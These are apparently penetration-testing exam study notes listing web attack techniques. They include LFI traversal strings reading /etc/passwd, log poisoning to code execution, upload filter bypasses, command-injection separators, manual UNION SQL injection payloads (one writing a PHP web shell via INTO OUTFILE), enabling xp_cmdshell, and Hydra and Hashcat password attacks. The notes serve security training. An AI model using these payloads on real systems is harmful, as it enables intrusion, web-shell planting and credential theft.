# Web Application Attacks & Manual SQLi

> Fill Weeks 15–18. No sqlmap — banned on exam.

## IDOR / API
Inspect headers, verb tampering, change `/api/user/102` → `/api/user/1` or `/admin`.

## LFI / Directory Traversal
```
../../../../etc/passwd
php://filter/convert.base64-encode/resource=index.php
```
Log poisoning: inject PHP in `User-Agent`, include access.log via LFI → RCE.

## File Upload / RFI / OS Command Injection
- Bypass filters: `.phtml`, `.phar`, `.aspx`; Content-Type manipulation; magic bytes `GIF89a;`
- Command injection: `;`, `|`, `&&`

## Manual SQL Injection
```sql
' ORDER BY 1-- -
' UNION SELECT 1,@@version,user(),database()-- -
' UNION SELECT 1,table_name,column_name,4 FROM information_schema.columns WHERE table_schema=database()-- -
' UNION SELECT 1,'<?php system($_GET["cmd"]); ?>',3,4 INTO OUTFILE '/var/www/html/shell.php'-- -
```
MSSQL: enable `xp_cmdshell` via `impacket-mssqlclient`.

## Password Attacks
- Hydra / Burp Intruder for SSH/FTP/RDP/HTTP POST (watch lockouts)
- Hash ID → Hashcat: MD5, Linux SHA-512/yescrypt, NTLM (`-m 1000`), Net-NTLMv2 (`-m 5600`), rockyou.txt + best64.rule

## References
PortSwigger Web Security Academy · PortSwigger SQLi Cheat Sheet
